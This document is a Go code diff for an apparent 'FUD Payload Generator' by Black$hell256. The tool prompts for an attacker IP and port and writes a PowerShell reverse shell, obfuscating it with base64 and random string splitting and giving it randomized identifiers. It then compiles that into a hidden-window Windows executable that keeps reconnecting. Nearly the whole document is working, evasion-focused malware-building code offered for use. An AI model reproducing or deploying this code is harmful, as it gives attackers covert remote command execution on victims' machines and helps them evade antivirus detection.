@@ -3,16 +3,16 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
-	"log"
-	"math/rand"
+	Rand "math/Rand"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
 	"time"
-	"path/filepath"
+	"unsafe"
 
 	"github.com/fatih/color"
 )
@@ -20,114 +20,196 @@ import (
 var name string
 var dir string
 
+const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+const (
+	letterIdxBits = 6
+	letterIdxMask = 1<<letterIdxBits - 1
+	letterIdxMax  = 63 / letterIdxBits
+)
+
 func main() {
 
+	Map_Leng := Language()
+	Generate(Map_Leng)
+}
+
+func Language() map[uint8]string {
+
+	Lang := os.Getenv("LANG")
+	Lang_Prefix := strings.HasPrefix(Lang, "es_ES")
+	var l map[uint8]string
+
+	switch Lang_Prefix {
+	case true:
+		l = map[uint8]string{
+			1: "Generador de Payloads FUD by Black$hell256",
+			2: "Ingresa ip: ",
+			3: "Ip invalida",
+			4: "Ingresa puerto: ",
+			5: "Puerto invalido",
+			6: "Ingresa nombre del archivo: ",
+			7: "Ingresa tiempo de reconexion: ",
+			8: "Tiempo invalido",
+			9: "\nCompilando archivo go..",
+		}
+
+	default:
+		l = map[uint8]string{
+			1: "FUD Payload Generator by Black$hell256",
+			2: "Enter ip: ",
+			3: "Invalid Ip",
+			4: "Enter port: ",
+			5: "Port invalid",
+			6: "Enter file name: ",
+			7: "Enter reconnection time: ",
+			8: "Invalid time",
+			9: "\nCompiling file go.",
+		}
+
+	}
+	return l
+
+}
+
+func Generate(l map[uint8]string) {
+
 	Execute("clear")
-	ex, er := os.Executable()
-    	if er != nil {
-        panic(er)
-    	}
-    	exPath := filepath.Dir(ex)
-	Env := os.Getenv("TEMP")
-	end := strings.HasPrefix(ex, Env)
-	if end {
-		temp, _ := os.Getwd()
-		dir = temp 
-	} else {
-		dir = exPath 
+	ex, err := os.Executable()
+	if err != nil {
+		panic(err)
 	}
 
-	var ip string
-	var port string
-	var session string
+	exPath := filepath.Dir(ex)
+	Env := os.Getenv("TEMP")
+	end := strings.HasPrefix(ex, Env)
 
-	color.Blue("Generador de Payloads FUD by Black$hell256" + "\n\n")
+	if end {
+		temp, err := os.Getwd()
+		if err != nil {
+			panic(err)
+		}
+		dir = temp
+	} else {
+		dir = exPath
+	}
+
+	var Ip string
+	var Port string
+	var Session string
+
+	color.Blue(l[1] + "\n\n")
 
 	red := color.New(color.FgRed).PrintfFunc()
 
 	for {
-		red("Ingresa ip: ")
-		fmt.Scan(&ip)
-		check := strings.ContainsAny(ip, ".")
-		if check {
+		red(l[2])
+		_, err := fmt.Scan(&Ip)
+		if err != nil {
+			panic(err)
+		}
+
+		Check_Ip := strings.ContainsAny(Ip, ".")
+		if Check_Ip {
 			break
 		} else {
-			color.Red("\n\n[!] Error : Ip invalida")
-			time.Sleep(2 * time.Second)
-			Execute("clear")
-			color.Blue("Generador de Payloads FUD by AnibalTlgram" + "\n\n")
+			cls(l[3], l)
+
 		}
 	}
+
+	var Port_temp int
+	for {
+		red(l[4])
+		_, err := fmt.Scan(&Port_temp)
+		if err != nil {
+			panic(err)
+		}
+
+		if 0 < Port_temp && Port_temp <= 65535 {
+			Port = strconv.Itoa(Port_temp)
+			break
+
+		}
+		cls(l[5], l)
+
+	}
+
+	red(l[6])
+	_, err2 := fmt.Scan(&name)
+	if err2 != nil {
+		panic(err)
+	}
+
+	var Temp_session int
 
 	for {
-		red("Ingresa puerto: ")
-		fmt.Scan(&port)
-		_, err := strconv.Atoi(port)
-		if err == nil {
-			break
+		red(l[7])
+		_, err := fmt.Scan(&Temp_session)
+		if err != nil {
+			panic(err)
 		}
-		color.Red("\n\n[!] Error : Puerto invalido")
-		time.Sleep(2 * time.Second)
-		Execute("clear")
-		color.Blue("Generador de Payloads FUD by AnibalTlgram" + "\n\n")
 
-	}
-
-	red("Ingresa nombre del archivo: ")
-	fmt.Scan(&name)
-
-	for {
-		red("Ingresa tiempo de reconexion: ")
-		fmt.Scan(&session)
-		_, err := strconv.Atoi(session)
-		if err == nil {
+		if Temp_session > 0 {
+			Session = strconv.Itoa(Temp_session)
 			break
+
 		}
-		color.Red("\n\n[!] Error : Tiempo invalido")
-		time.Sleep(2 * time.Second)
-		Execute("clear")
-		color.Blue("Generador de Payloads FUD by AnibalTlgram" + "\n\n")
+		cls(l[8], l)
 
 	}
 
-	Payload := `$x = 'UwBvAGM'; $xd = 'AawBlA'; $client = New-Object System.Net.$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(('{0}{1}HQAcwA=' -f $x, $xd)))).TCPClient("` + ip + `" ,` + port + `);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = ('{0}PS ' -f $sb) + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes(('{0}') -f $sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};('{0}.Close()' -f $client)`
-	Random := String(20)
-	var a []string
-	for _, va := range Random {
+	Payload := `$x = 'UwBvAGM'; $xd = 'AawBlA'; $client = New-Object System.Net.$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(('{0}{1}HQAcwA=' -f $x, $xd)))).TCPClient("` + Ip + `" ,` + Port + `);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = ('{0}PS ' -f $sb) + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes(('{0}') -f $sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};('{0}.Close()' -f $client)`
+	Random := RandStringBytesMaskImprSrcUnsafe(10)
 
-		c := fmt.Sprintf("(?:(?:%s))", va)
-		a = append(a, c)
+	var Slice []string
+	for _, Rune := range Random {
+
+		Sprinft := fmt.Sprintf("(?:(?:%s))", string(Rune))
+		Slice = append(Slice, Sprinft)
 
 	}
 
-	Join := strings.Join(a, "|")
-	re := regexp.MustCompile(Join)
-	Split := Split(re, Payload, -1)
-	var e []string
+	Join := strings.Join(Slice, "|")
+	Regex := regexp.MustCompile(Join)
+	Split := Split(Regex, Payload, -1)
 
-	for _, pe := range Split {
+	var Slice2 []string
 
-		a := fmt.Sprintln("\t" + "code += `" + pe + "`")
-		e = append(e, a)
+	code := RandStringBytesMaskImprSrcUnsafe(36)
+	for _, letters := range Split {
+
+		Sprinft2 := fmt.Sprintln("\t" + code + " += `" + letters + "`")
+		Slice2 = append(Slice2, Sprinft2)
 	}
 
-	delimiters := strings.Join(e, "")
+	Delimiters := strings.Join(Slice2, "")
+	cmd := RandStringBytesMaskImprSrcUnsafe(40)
+	exec := RandStringBytesMaskImprSrcUnsafe(39)
+	time := RandStringBytesMaskImprSrcUnsafe(38)
+	syscall := RandStringBytesMaskImprSrcUnsafe(37)
 
-	data := []byte("package main\n\nimport (\n\t" + `"os/exec"` +
-		"\n\t" + `"syscall"` + "\n\t" + `"time"` + "\n)\n\n" +
-		"func main() {\n\n\t" + `code := ""` + "\n" + delimiters +
-		"\n\tfor {\n\t\t" + `cmd := exec.Command("powershell", "-c", code)` + "\n\t\t" +
-		`cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}` + "\n\t\tcmd.Run()" +
-		"\n\t\ttime.Sleep(" + session + "* time.Second)\n\t" + "}\n" + "}")
+	data := []byte("package main\n\nimport (\n\t" + exec + `  "os/exec"` +
+		"\n\t" + syscall + `  "syscall"` + "\n\t" + time + `  "time"` + "\n)\n\n" +
+		"func main() {\n\n\t" + code + ` := ""` + "\n" + Delimiters +
+		"\n\tfor {\n\t\t" + cmd + ` := ` + exec + `.Command("powershell", "-c", ` + code + `)` + "\n\t\t" +
+		cmd + `.SysProcAttr = &` + syscall + `.SysProcAttr{HideWindow: true}` + "\n\t\t" + cmd + ".Run()" +
+		"\n\t\t" + time + ".Sleep(" + Session + "* " + time + ".Second)\n\t" + "}\n" + "}")
 
-	err := ioutil.WriteFile(name+".go", data, 0644)
-	if err != nil {
-		log.Fatalf("%v", err)
+	err3 := ioutil.WriteFile(name+".go", data, 0644)
+	if err3 != nil {
+		panic(err3)
 	}
 
-	color.Blue("\nCompilando archivo go..")
+	color.Blue(l[9])
 	Execute("comp")
 
+}
+
+func cls(msg string, l map[uint8]string) {
+	color.Red("\n\n[!] Error : " + msg)
+	time.Sleep(2 * time.Second)
+	Execute("clear")
+	color.Blue(l[1] + "\n\n")
 }
 
 func Execute(command string) {
@@ -136,9 +218,9 @@ func Execute(command string) {
 
 	switch runtime.GOOS {
 	case "windows":
-		file := dir + "\\" + name + ".go"
 		if command == "comp" {
-			command = `go build -ldflags "-H windowsgui -s -w" `+ file
+			file := dir + "\\" + name + ".go"
+			command = `go build -ldflags "-H windowsgui -s -w" ` + file
 		}
 		cmd = exec.Command("powershell", "-c", command)
 	default:
@@ -149,7 +231,11 @@ func Execute(command string) {
 		cmd = exec.Command("sh", "-c", command)
 	}
 
-	output, _ = cmd.Output()
+	var err error
+	output, err = cmd.Output()
+	if err != nil {
+		panic(err)
+	}
 	fmt.Println(string(output))
 }
 
@@ -183,23 +269,20 @@ func Split(re *regexp.Regexp, s string, n int) []string {
 	return strings
 }
 
-func Int(min, max int) int {
-	return min + rand.Intn(max-min)
-}
-
-func String(len int) []string {
-	var e []string
-
-	rand.Seed(time.Now().UnixNano())
-	bytes := make([]byte, len)
-	for i := range bytes {
-		bytes[i] = byte(Int(65, 90))
+func RandStringBytesMaskImprSrcUnsafe(n int) string {
+	var src = Rand.NewSource(time.Now().UnixNano())
+	b := make([]byte, n)
+	for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
+		if remain == 0 {
+			cache, remain = src.Int63(), letterIdxMax
+		}
+		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
+			b[i] = letterBytes[idx]
+			i--
+		}
+		cache >>= letterIdxBits
+		remain--
 	}
 
-	for _, a := range string(bytes) {
-		e = append(e, string(a))
-
-	}
-	return e
-
+	return *(*string)(unsafe.Pointer(&b))
 }
